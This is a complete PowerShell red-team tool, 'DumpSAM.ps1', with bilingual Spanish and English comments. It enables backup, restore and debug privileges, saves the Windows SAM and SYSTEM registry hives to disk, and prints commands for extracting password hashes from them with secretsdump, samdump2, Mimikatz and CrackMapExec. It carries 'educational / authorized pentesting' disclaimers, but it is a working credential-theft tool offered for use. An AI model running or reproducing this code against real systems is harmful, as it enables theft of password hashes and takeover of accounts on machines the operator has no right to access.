<#
.SYNOPSIS
    Script de volcado de la base de datos SAM de Windows
    Windows SAM Database Dumping Script

.DESCRIPTION
    Este script intenta volcar los hashes de contraseñas de la base de datos SAM local.
    Requiere privilegios de administrador o SYSTEM.
    This script attempts to dump password hashes from the local SAM database.
    Requires administrator or SYSTEM privileges.

.PARAMETER OutputPath
    Ruta personalizada para guardar los archivos de volcado
    Custom path to save dump files

.PARAMETER AutoCleanup
    Elimina automáticamente los archivos de volcado después de mostrar la información
    Automatically removes dump files after displaying information

.PARAMETER SkipConfirmation
    Omite la confirmación interactiva antes de realizar el volcado
    Skips interactive confirmation before performing the dump

.PARAMETER LogFile
    Ruta opcional para guardar un archivo de log de la operación
    Optional path to save an operation log file

.EXAMPLE
    .\DumpSAM.ps1
    Ejecuta el script de forma interactiva

.EXAMPLE
    .\DumpSAM.ps1 -OutputPath "C:\Temp\SAMDump" -SkipConfirmation
    Ejecuta el script sin confirmación y guarda en ruta personalizada

.EXAMPLE
    .\DumpSAM.ps1 -AutoCleanup -LogFile "C:\Logs\samdump.log"
    Ejecuta con limpieza automática y guarda log de operaciones

.NOTES
    Autor: RedTeam-Bypass
    Versión: 2.0
    Propósito: Educativo / Pruebas de penetración autorizadas
    Purpose: Educational / Authorized Penetration Testing

    ADVERTENCIA: Este script es solo para uso educativo y pruebas de penetración autorizadas.
    WARNING: This script is for educational and authorized penetration testing only.

    Requisitos:
    - PowerShell 5.1 o superior
    - Windows NT 6.1 o superior (Windows 7/Server 2008 R2+)
    - Privilegios de administrador
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [ValidateScript({
        if (-not (Test-Path $_ -IsValid)) {
            throw "La ruta especificada no es válida: $_"
        }
        return $true
    })]
    [string]$OutputPath,

    [Parameter(Mandatory=$false)]
    [switch]$AutoCleanup,

    [Parameter(Mandatory=$false)]
    [switch]$SkipConfirmation,

    [Parameter(Mandatory=$false)]
    [ValidateScript({
        $parent = Split-Path $_ -Parent
        if ($parent -and -not (Test-Path $parent)) {
            throw "El directorio padre no existe: $parent"
        }
        return $true
    })]
    [string]$LogFile
)

#Requires -RunAsAdministrator
#Requires -Version 5.1

# Configuración de ErrorActionPreference
$ErrorActionPreference = "Stop"
$script:DumpPath = $null
$script:CleanupRegistered = $false

# ============================================
# Tipos de Windows API
# ============================================

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class WinAPI {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        int TokenInformationClass,
        IntPtr TokenInformation,
        uint TokenInformationLength,
        out uint ReturnLength
    );

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        out LUID lpLuid
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public const string SE_BACKUP_NAME = "SeBackupPrivilege";
    public const string SE_RESTORE_NAME = "SeRestorePrivilege";
    public const string SE_DEBUG_NAME = "SeDebugPrivilege";
}
"@ -ErrorAction SilentlyContinue

# ============================================
# Funciones de Utilidad
# ============================================

function Write-Log {
    <#
    .SYNOPSIS
    Escribe un mensaje en la consola y opcionalmente en un archivo de log
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,

        [Parameter(Mandatory=$false)]
        [ValidateSet('Info', 'Success', 'Warning', 'Error', 'Debug')]
        [string]$Level = 'Info',

        [Parameter(Mandatory=$false)]
        [switch]$NoConsole
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"

    # Escribir a archivo si está configurado
    if ($script:LogFile) {
        try {
            Add-Content -Path $script:LogFile -Value $logMessage -ErrorAction SilentlyContinue
        }
        catch {
            Write-Warning "No se pudo escribir al archivo de log: $_"
        }
    }

    # Escribir a consola
    if (-not $NoConsole) {
        $color = switch ($Level) {
            'Info'    { 'Cyan' }
            'Success' { 'Green' }
            'Warning' { 'Yellow' }
            'Error'   { 'Red' }
            'Debug'   { 'Gray' }
            default   { 'White' }
        }

        $prefix = switch ($Level) {
            'Info'    { '[*]' }
            'Success' { '[+]' }
            'Warning' { '[!]' }
            'Error'   { '[-]' }
            'Debug'   { '[?]' }
            default   { '[*]' }
        }

        Write-Host "$prefix $Message" -ForegroundColor $color
    }
}

function Write-Banner {
    <#
    .SYNOPSIS
    Muestra el banner del script
    #>
    Write-Host ""
    Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║   Volcado de Base de Datos SAM - DumpSAM.ps1 v2.0        ║" -ForegroundColor Cyan
    Write-Host "║   SAM Database Dump Tool                                  ║" -ForegroundColor Cyan
    Write-Host "║   Uso Educativo y Pentesting Autorizado Únicamente       ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

function Test-SystemCompatibility {
    <#
    .SYNOPSIS
    Verifica que el sistema sea compatible con el script
    #>
    [CmdletBinding()]
    [OutputType([bool])]
    param()

    Write-Log "Verificando compatibilidad del sistema..." -Level Info

    # Verificar versión de PowerShell
    $psVersion = $PSVersionTable.PSVersion
    if ($psVersion.Major -lt 5) {
        Write-Log "PowerShell $($psVersion.Major).$($psVersion.Minor) no es compatible. Se requiere PowerShell 5.1 o superior" -Level Error
        return $false
    }
    Write-Log "PowerShell $($psVersion.Major).$($psVersion.Minor) - Compatible" -Level Success

    # Verificar que sea Windows
    if (-not $IsWindows -and $null -ne $IsWindows) {
        Write-Log "Este script solo funciona en sistemas Windows" -Level Error
        return $false
    }

    # Verificar versión de Windows
    try {
        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop
        $osVersion = [System.Version]$os.Version

        Write-Log "Sistema Operativo: $($os.Caption)" -Level Info
        Write-Log "Versión: $($os.Version)" -Level Info

        # Windows 7/Server 2008 R2 = NT 6.1
        if ($osVersion.Major -lt 6 -or ($osVersion.Major -eq 6 -and $osVersion.Minor -lt 1)) {
            Write-Log "Windows NT $($osVersion.Major).$($osVersion.Minor) no es compatible. Se requiere Windows 7/Server 2008 R2 o superior" -Level Error
            return $false
        }

        Write-Log "Versión de Windows compatible" -Level Success
    }
    catch {
        Write-Log "No se pudo verificar la versión de Windows: $_" -Level Warning
    }

    return $true
}

function Test-IsSystem {
    <#
    .SYNOPSIS
    Verifica si el script se ejecuta como NT AUTHORITY\SYSTEM

    .OUTPUTS
    [bool] True si se ejecuta como SYSTEM, False en caso contrario
    #>
    [CmdletBinding()]
    [OutputType([bool])]
    param()

    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $isSystem = $identity.User.Value -eq "S-1-5-18"

        if ($isSystem) {
            Write-Verbose "Ejecutando como NT AUTHORITY\SYSTEM"
        }
        else {
            Write-Verbose "No ejecutando como SYSTEM (Usuario: $($identity.Name))"
        }

        return $isSystem
    }
    catch {
        Write-Log "Error al verificar el contexto de SYSTEM: $_" -Level Error
        return $false
    }
}

function Enable-Privilege {
    <#
    .SYNOPSIS
    Habilita un privilegio específico en el token del proceso actual

    .DESCRIPTION
    Utiliza la API de Windows para ajustar los privilegios del token del proceso.
    Comúnmente usado para habilitar SeBackupPrivilege, SeRestorePrivilege, etc.

    .PARAMETER PrivilegeName
    Nombre del privilegio a habilitar (ej: SeBackupPrivilege)

    .OUTPUTS
    [bool] True si el privilegio se habilitó exitosamente, False en caso contrario

    .EXAMPLE
    Enable-Privilege -PrivilegeName "SeBackupPrivilege"
    #>
    [CmdletBinding()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$PrivilegeName
    )

    $tokenHandle = [IntPtr]::Zero

    try {
        # Obtener handle del proceso actual
        $processHandle = [WinAPI]::GetCurrentProcess()

        # Abrir token del proceso
        $success = [WinAPI]::OpenProcessToken(
            $processHandle,
            [WinAPI]::TOKEN_ADJUST_PRIVILEGES -bor [WinAPI]::TOKEN_QUERY,
            [ref]$tokenHandle
        )

        if (-not $success) {
            $lastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Log "No se pudo abrir el token del proceso. Error Win32: $lastError" -Level Warning
            return $false
        }

        # Buscar el LUID del privilegio
        $luid = New-Object WinAPI+LUID
        $success = [WinAPI]::LookupPrivilegeValue($null, $PrivilegeName, [ref]$luid)

        if (-not $success) {
            $lastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Log "No se pudo buscar el privilegio '$PrivilegeName'. Error Win32: $lastError" -Level Warning
            return $false
        }

        # Preparar estructura TOKEN_PRIVILEGES
        $tp = New-Object WinAPI+TOKEN_PRIVILEGES
        $tp.PrivilegeCount = 1
        $tp.Privileges.Luid = $luid
        $tp.Privileges.Attributes = [WinAPI]::SE_PRIVILEGE_ENABLED

        # Ajustar privilegios del token
        $success = [WinAPI]::AdjustTokenPrivileges(
            $tokenHandle,
            $false,
            [ref]$tp,
            0,
            [IntPtr]::Zero,
            [IntPtr]::Zero
        )

        if (-not $success) {
            $lastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Log "No se pudo ajustar los privilegios del token. Error Win32: $lastError" -Level Warning
            return $false
        }

        # Verificar si realmente se habilitó el privilegio
        $lastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if ($lastError -eq 1300) { # ERROR_NOT_ALL_ASSIGNED
            Write-Log "El privilegio '$PrivilegeName' no está disponible para este usuario" -Level Warning
            return $false
        }

        Write-Log "Privilegio '$PrivilegeName' habilitado exitosamente" -Level Success
        return $true
    }
    catch {
        Write-Log "Error habilitando privilegio '$PrivilegeName': $_" -Level Error
        return $false
    }
    finally {
        # Asegurar que se cierre el handle del token
        if ($tokenHandle -ne [IntPtr]::Zero) {
            [void][WinAPI]::CloseHandle($tokenHandle)
        }
    }
}

function Get-SystemInfo {
    <#
    .SYNOPSIS
    Muestra información del sistema relevante para el volcado SAM
    #>
    [CmdletBinding()]
    param()

    Write-Host ""
    Write-Log "Información del Sistema:" -Level Info

    try {
        $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue

        Write-Host "    Computadora:        $env:COMPUTERNAME" -ForegroundColor White
        Write-Host "    Usuario actual:     $env:USERNAME" -ForegroundColor White
        Write-Host "    Dominio:            $env:USERDOMAIN" -ForegroundColor White

        if ($computerSystem) {
            Write-Host "    Modelo:             $($computerSystem.Model)" -ForegroundColor White
        }

        if ($os) {
            Write-Host "    OS:                 $($os.Caption)" -ForegroundColor White
            Write-Host "    Arquitectura:       $($os.OSArchitecture)" -ForegroundColor White
        }

        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        Write-Host "    SID:                $($identity.User.Value)" -ForegroundColor White

        if (Test-IsSystem) {
            Write-Host "    Ejecutando como:    NT AUTHORITY\SYSTEM" -ForegroundColor Green
        }
        else {
            $principal = New-Object Security.Principal.WindowsPrincipal($identity)
            $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

            if ($isAdmin) {
                Write-Host "    Ejecutando como:    Administrador" -ForegroundColor Yellow
            }
            else {
                Write-Host "    Ejecutando como:    Usuario estándar" -ForegroundColor Red
            }
        }

        Write-Host ""
    }
    catch {
        Write-Log "Error obteniendo información del sistema: $_" -Level Error
    }
}

function Show-SAMDatabaseInfo {
    <#
    .SYNOPSIS
    Muestra información educativa sobre la base de datos SAM
    #>
    [CmdletBinding()]
    param()

    Write-Host ""
    Write-Log "Información sobre la Base de Datos SAM:" -Level Info
    Write-Host ""
    Write-Host "La base de datos Security Account Manager (SAM) contiene:" -ForegroundColor White
    Write-Host "  • Nombres de usuario locales" -ForegroundColor Gray
    Write-Host "  • Hashes de contraseñas (NT hash, LM hash obsoleto)" -ForegroundColor Gray
    Write-Host "  • SIDs (Security Identifiers)" -ForegroundColor Gray
    Write-Host "  • Membresías de grupos locales" -ForegroundColor Gray
    Write-Host "  • Políticas de contraseñas" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Ubicación en Registro:" -ForegroundColor White
    Write-Host "  HKLM\SAM\SAM\Domains\Account\Users" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Protección:" -ForegroundColor White
    Write-Host "  • Solo accesible por NT AUTHORITY\SYSTEM" -ForegroundColor Gray
    Write-Host "  • Requiere SeBackupPrivilege para exportación" -ForegroundColor Gray
    Write-Host "  • ACLs restrictivas en claves de registro" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Estructura de cifrado de hashes:" -ForegroundColor White
    Write-Host "  1. Hash MD4 de la contraseña (NT hash)" -ForegroundColor Gray
    Write-Host "  2. Cifrado DES usando RID del usuario" -ForegroundColor Gray
    Write-Host "  3. Cifrado con Password Encryption Key (PEK)" -ForegroundColor Gray
    Write-Host "  4. PEK cifrado con LSA System Key (SysKey)" -ForegroundColor Gray
    Write-Host "  5. SysKey almacenado en HKLM\SYSTEM" -ForegroundColor Gray
    Write-Host ""
}

function Register-Cleanup {
    <#
    .SYNOPSIS
    Registra un evento de limpieza para cuando el script termine
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )

    if ($script:CleanupRegistered) {
        return
    }

    $script:DumpPath = $Path

    # Registrar evento de limpieza cuando el script termine
    Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
        if ($script:DumpPath -and (Test-Path $script:DumpPath)) {
            try {
                Remove-Item -Path $script:DumpPath -Recurse -Force -ErrorAction SilentlyContinue
                Write-Host "[*] Archivos temporales eliminados: $script:DumpPath" -ForegroundColor Yellow
            }
            catch {
                Write-Host "[!] No se pudieron eliminar archivos temporales: $script:DumpPath" -ForegroundColor Red
            }
        }
    } | Out-Null

    $script:CleanupRegistered = $true
}

function Remove-DumpFiles {
    <#
    .SYNOPSIS
    Elimina de forma segura los archivos de volcado
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )

    if (-not (Test-Path $Path)) {
        Write-Log "La ruta de volcado no existe: $Path" -Level Warning
        return
    }

    try {
        Write-Log "Eliminando archivos de volcado..." -Level Info

        # Sobrescribir archivos antes de eliminarlos (seguridad adicional)
        Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $file = $_.FullName
                $size = $_.Length

                if ($size -gt 0) {
                    # Sobrescribir con ceros
                    $zeros = New-Object byte[] $size
                    [System.IO.File]::WriteAllBytes($file, $zeros)
                }

                Remove-Item -Path $file -Force -ErrorAction Stop
                Write-Verbose "Archivo eliminado de forma segura: $file"
            }
            catch {
                Write-Log "Error eliminando archivo $($_.Name): $_" -Level Warning
            }
        }

        # Eliminar directorio
        Remove-Item -Path $Path -Recurse -Force -ErrorAction Stop
        Write-Log "Archivos de volcado eliminados exitosamente" -Level Success
    }
    catch {
        Write-Log "Error durante la limpieza: $_" -Level Error
    }
}

function Export-RegistryHive {
    <#
    .SYNOPSIS
    Exporta una clave de registro a un archivo usando reg.exe

    .PARAMETER HivePath
    Ruta de la clave de registro (ej: HKLM\SAM)

    .PARAMETER OutputFile
    Ruta del archivo de salida

    .OUTPUTS
    [bool] True si la exportación fue exitosa, False en caso contrario
    #>
    [CmdletBinding()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$HivePath,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$OutputFile
    )

    try {
        Write-Log "Exportando clave de registro: $HivePath" -Level Info

        # Construir argumentos para reg.exe
        $arguments = "save `"$HivePath`" `"$OutputFile`" /y"

        # Ejecutar reg.exe
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "reg.exe"
        $psi.Arguments = $arguments
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true

        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $psi

        [void]$process.Start()

        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()

        $process.WaitForExit()

        $exitCode = $process.ExitCode

        if ($exitCode -eq 0) {
            Write-Log "Clave exportada exitosamente: $HivePath" -Level Success

            # Verificar que el archivo se creó
            if (Test-Path $OutputFile) {
                $fileSize = (Get-Item $OutputFile).Length
                Write-Verbose "Archivo creado: $OutputFile ($fileSize bytes)"
                return $true
            }
            else {
                Write-Log "El archivo no se creó correctamente: $OutputFile" -Level Error
                return $false
            }
        }
        else {
            Write-Log "Error exportando clave de registro. Código de salida: $exitCode" -Level Error

            if ($stderr) {
                Write-Verbose "Error estándar: $stderr"
            }

            return $false
        }
    }
    catch {
        Write-Log "Excepción durante la exportación de registro: $_" -Level Error
        return $false
    }
}

function Get-SAMHashes {
    <#
    .SYNOPSIS
    Realiza el volcado de la base de datos SAM

    .PARAMETER OutputPath
    Ruta donde guardar los archivos de volcado

    .OUTPUTS
    [hashtable] Información sobre el volcado realizado
    #>
    [CmdletBinding()]
    [OutputType([hashtable])]
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutputPath
    )

    Write-Host ""
    Write-Log "Iniciando volcado de la base de datos SAM..." -Level Info
    Write-Host ""

    # Determinar ruta de salida
    if ([string]::IsNullOrEmpty($OutputPath)) {
        $tempPath = Join-Path $env:TEMP "SAMDump_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$(Get-Random -Maximum 9999)"
    }
    else {
        $tempPath = $OutputPath
    }

    $result = @{
        Success = $false
        SAMFile = $null
        SYSTEMFile = $null
        OutputPath = $tempPath
        Timestamp = Get-Date
    }

    try {
        # Crear directorio de salida
        if (-not (Test-Path $tempPath)) {
            New-Item -ItemType Directory -Path $tempPath -Force -ErrorAction Stop | Out-Null
            Write-Log "Directorio de volcado creado: $tempPath" -Level Success
        }

        # Registrar limpieza automática si se solicita
        if ($AutoCleanup) {
            Register-Cleanup -Path $tempPath
        }

        # Definir rutas de archivos
        $samFile = Join-Path $tempPath "sam.hive"
        $systemFile = Join-Path $tempPath "system.hive"

        $result.SAMFile = $samFile
        $result.SYSTEMFile = $systemFile

        # Exportar clave SAM
        Write-Host ""
        $samSuccess = Export-RegistryHive -HivePath "HKLM\SAM" -OutputFile $samFile

        if (-not $samSuccess) {
            Write-Log "No se pudo exportar la clave SAM" -Level Error
            Write-Log "Asegúrese de ejecutar como Administrador o SYSTEM con privilegios apropiados" -Level Warning
            return $result
        }

        # Exportar clave SYSTEM
        Write-Host ""
        $systemSuccess = Export-RegistryHive -HivePath "HKLM\SYSTEM" -OutputFile $systemFile

        if (-not $systemSuccess) {
            Write-Log "No se pudo exportar la clave SYSTEM" -Level Error
            return $result
        }

        $result.Success = $true

        # Mostrar información sobre los archivos generados
        Write-Host ""
        Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║                  VOLCADO COMPLETADO                       ║" -ForegroundColor Green
        Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Green
        Write-Host ""
        Write-Log "Archivos generados:" -Level Success
        Write-Host ""

        # Información detallada de archivos
        $samInfo = Get-Item $samFile
        $systemInfo = Get-Item $systemFile

        Write-Host "  SAM Hive:" -ForegroundColor Cyan
        Write-Host "    Ruta:     $samFile" -ForegroundColor White
        Write-Host "    Tamaño:   $([math]::Round($samInfo.Length / 1KB, 2)) KB" -ForegroundColor White
        Write-Host "    Creado:   $($samInfo.CreationTime)" -ForegroundColor White
        Write-Host ""

        Write-Host "  SYSTEM Hive:" -ForegroundColor Cyan
        Write-Host "    Ruta:     $systemFile" -ForegroundColor White
        Write-Host "    Tamaño:   $([math]::Round($systemInfo.Length / 1KB, 2)) KB" -ForegroundColor White
        Write-Host "    Creado:   $($systemInfo.CreationTime)" -ForegroundColor White
        Write-Host ""

        # Instrucciones de uso
        Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
        Write-Host "║              INSTRUCCIONES DE EXTRACCIÓN                  ║" -ForegroundColor Yellow
        Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
        Write-Host ""
        Write-Log "Para extraer los hashes, use herramientas especializadas:" -Level Info
        Write-Host ""

        Write-Host "  1. Impacket secretsdump.py:" -ForegroundColor Cyan
        Write-Host "     secretsdump.py -sam '$samFile' -system '$systemFile' LOCAL" -ForegroundColor White
        Write-Host ""

        Write-Host "  2. samdump2 (Linux):" -ForegroundColor Cyan
        Write-Host "     samdump2 '$systemFile' '$samFile'" -ForegroundColor White
        Write-Host ""

        Write-Host "  3. Mimikatz:" -ForegroundColor Cyan
        Write-Host "     lsadump::sam /sam:'$samFile' /system:'$systemFile'" -ForegroundColor White
        Write-Host ""

        Write-Host "  4. CrackMapExec:" -ForegroundColor Cyan
        Write-Host "     cme smb --local-auth --sam '$samFile' --system '$systemFile'" -ForegroundColor White
        Write-Host ""

        # Advertencia sobre limpieza
        if ($AutoCleanup) {
            Write-Log "Los archivos se eliminarán automáticamente al finalizar el script" -Level Warning
        }
        else {
            Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Red
            Write-Host "║                      ADVERTENCIA                          ║" -ForegroundColor Red
            Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Red
            Write-Host ""
            Write-Log "IMPORTANTE: Elimine estos archivos cuando termine de usarlos" -Level Warning
            Write-Host ""
            Write-Host "  Para eliminar de forma segura:" -ForegroundColor Yellow
            Write-Host "  Remove-Item -Path '$tempPath' -Recurse -Force" -ForegroundColor White
            Write-Host ""
        }

        return $result
    }
    catch {
        Write-Log "Error durante el volcado: $_" -Level Error
        Write-Log $_.ScriptStackTrace -Level Debug
        return $result
    }
}

# ============================================
# Función Principal
# ============================================

function Invoke-SAMDump {
    <#
    .SYNOPSIS
    Función principal que coordina el volcado de SAM
    #>
    [CmdletBinding()]
    param()

    try {
        # Mostrar banner
        Write-Banner

        # Inicializar archivo de log si se especificó
        if ($LogFile) {
            $script:LogFile = $LogFile

            # Crear directorio padre si no existe
            $logDir = Split-Path $LogFile -Parent
            if ($logDir -and -not (Test-Path $logDir)) {
                New-Item -ItemType Directory -Path $logDir -Force | Out-Null
            }

            # Escribir encabezado del log
            $separator = "=" * 80
            Add-Content -Path $LogFile -Value $separator
            Add-Content -Path $LogFile -Value "SAM Dump Operation - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            Add-Content -Path $LogFile -Value $separator

            Write-Log "Log habilitado: $LogFile" -Level Success
        }

        # Verificar compatibilidad del sistema
        if (-not (Test-SystemCompatibility)) {
            Write-Log "El sistema no cumple con los requisitos mínimos" -Level Error
            exit 1
        }

        Write-Host ""

        # Mostrar información del sistema
        Get-SystemInfo

        # Verificar privilegios de administrador
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

        if (-not $isAdmin) {
            Write-Log "ADVERTENCIA: Este script requiere privilegios de administrador" -Level Error
            Write-Log "Por favor, ejecute PowerShell como Administrador" -Level Error
            exit 1
        }

        Write-Log "Ejecutando con privilegios de administrador" -Level Success
        Write-Host ""

        # Habilitar privilegios necesarios
        Write-Log "Habilitando privilegios del sistema..." -Level Info
        Write-Host ""

        $privilegesEnabled = 0

        if (Enable-Privilege -PrivilegeName "SeBackupPrivilege") {
            $privilegesEnabled++
        }

        if (Enable-Privilege -PrivilegeName "SeRestorePrivilege") {
            $privilegesEnabled++
        }

        if (Enable-Privilege -PrivilegeName "SeDebugPrivilege") {
            $privilegesEnabled++
        }

        if ($privilegesEnabled -eq 0) {
            Write-Log "No se pudo habilitar ningún privilegio. El volcado puede fallar" -Level Warning
        }
        else {
            Write-Host ""
            Write-Log "$privilegesEnabled privilegio(s) habilitado(s) exitosamente" -Level Success
        }

        # Mostrar información educativa
        Show-SAMDatabaseInfo

        # Solicitar confirmación si no se omitió
        if (-not $SkipConfirmation) {
            Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
            Write-Host "║                      CONFIRMACIÓN                         ║" -ForegroundColor Yellow
            Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "Este script realizará las siguientes acciones:" -ForegroundColor White
            Write-Host "  • Exportar la clave de registro HKLM\SAM" -ForegroundColor Gray
            Write-Host "  • Exportar la clave de registro HKLM\SYSTEM" -ForegroundColor Gray
            Write-Host "  • Guardar los archivos en una ubicación temporal" -ForegroundColor Gray
            Write-Host ""
            Write-Host "ADVERTENCIA: Solo use esta herramienta en sistemas donde" -ForegroundColor Red
            Write-Host "tenga autorización explícita para realizar pruebas de seguridad." -ForegroundColor Red
            Write-Host ""

            Write-Host "¿Desea continuar? (S/N): " -ForegroundColor Yellow -NoNewline
            $response = Read-Host

            if ($response -notmatch '^[SsYy]$') {
                Write-Log "Operación cancelada por el usuario" -Level Warning
                exit 0
            }
        }

        # Realizar el volcado
        $dumpResult = Get-SAMHashes -OutputPath $OutputPath

        # Verificar si el volcado fue exitoso
        if ($dumpResult.Success) {
            Write-Host ""
            Write-Log "Operación completada exitosamente" -Level Success

            # Si se solicita auto-limpieza, informar al usuario
            if ($AutoCleanup) {
                Write-Host ""
                Write-Log "Los archivos se eliminarán al cerrar este script" -Level Info
            }
        }
        else {
            Write-Host ""
            Write-Log "El volcado no se completó exitosamente" -Level Error

            # Intentar limpiar archivos parciales si es necesario
            if ($AutoCleanup -and $dumpResult.OutputPath -and (Test-Path $dumpResult.OutputPath)) {
                Remove-DumpFiles -Path $dumpResult.OutputPath
            }

            exit 1
        }
    }
    catch {
        Write-Log "Error crítico durante la ejecución: $_" -Level Error
        Write-Log $_.ScriptStackTrace -Level Debug
        exit 1
    }
    finally {
        # Si no hay auto-limpieza, el usuario debe limpiar manualmente
        if (-not $AutoCleanup) {
            Write-Host ""
            Write-Host "Presione Enter para finalizar..." -ForegroundColor Cyan
            Read-Host | Out-Null
        }
    }
}

# ============================================
# Ejecutar el script
# ============================================

Invoke-SAMDump
